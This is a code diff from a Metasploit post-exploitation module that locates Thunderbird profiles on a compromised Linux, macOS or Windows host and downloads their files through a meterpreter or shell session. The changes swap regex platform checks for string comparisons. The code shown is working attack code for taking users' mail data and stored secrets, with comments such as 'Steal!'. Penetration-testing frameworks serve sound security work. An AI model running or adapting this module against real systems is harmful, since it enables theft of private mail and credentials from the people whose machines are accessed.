@@ -42,14 +42,14 @@ class MetasploitModule < Msf::Post
   def run
     # Initialize Thunderbird's base path based on the platform
     case session.platform
-    when /linux/
+    when 'linux'
       user = session.shell_command("whoami").chomp
       base = "/home/#{user}/.thunderbird/"
-    when /osx/
+    when 'osx'
       user = session.shell_command("whoami").chomp
       base = "/Users/#{user}/Library/Thunderbird/Profiles/"
-    when /windows/
-      if session.type =~ /meterpreter/
+    when 'windows'
+      if session.type == 'meterpreter'
         user_profile = session.sys.config.getenv('APPDATA')
       else
         user_profile = cmd_exec("echo %APPDATA%").strip
@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Post
     # Steal!
     profiles.each do |profile|
       next if profile =~ /^\./
-      slash = (session.platform =~ /windows/) ? "\\" : "/"
+      slash = (session.platform == 'windows') ? "\\" : "/"
       p = base + profile + slash
 
       # Download the database, and attempt to process the content
@@ -86,7 +86,7 @@ class MetasploitModule < Msf::Post
       loot = ''
 
       # Downaload the file
-      if session.type =~ /meterpreter/
+      if session.type == 'meterpreter'
         vprint_status("Downloading: #{p + item}")
         begin
           f = session.fs.file.new(p + item, 'rb')
@@ -97,8 +97,8 @@ class MetasploitModule < Msf::Post
         ensure
           f.close
         end
-      elsif session.type =~ /shell/
-        cmd_show = (session.platform =~ /windows/) ? 'type' : 'cat'
+      elsif session.type == 'shell'
+        cmd_show = (session.platform == 'windows') ? 'type' : 'cat'
         # The type command will add a 0x0a character in the file?  Pff.
         # Gotta lstrip that.
         loot = cmd_exec(cmd_show, "\"#{p+item}\"").lstrip
@@ -205,17 +205,17 @@ class MetasploitModule < Msf::Post
   def get_profile_names(path)
     tb_profiles = []
 
-    if session.type =~ /meterpreter/
+    if session.type == 'meterpreter'
       session.fs.dir.foreach(path) do |subdir|
         tb_profiles << subdir
       end
     else
-      cmd = (session.platform =~ /windows/) ? "dir \"#{path}\"" : "ls -ld #{path}*/"
+      cmd = (session.platform == 'windows') ? "dir \"#{path}\"" : "ls -ld #{path}*/"
       dir = cmd_exec(cmd)
       dir.each_line do |line|
         line = line.strip
-        next if session.platform =~ /windows/ and line !~ /<DIR>((.+)\.(\w+)$)/
-        next if session.platform =~ /linux|osx/ and line !~ /(\w+\.\w+)/
+        next if session.platform == 'windows' && line !~ /<DIR>((.+)\.(\w+)$)/
+        next if (session.platform == 'linux' || session.platform == 'osx') && line !~ /(\w+\.\w+)/
         tb_profiles << $1 if not $1.nil?
       end
     end
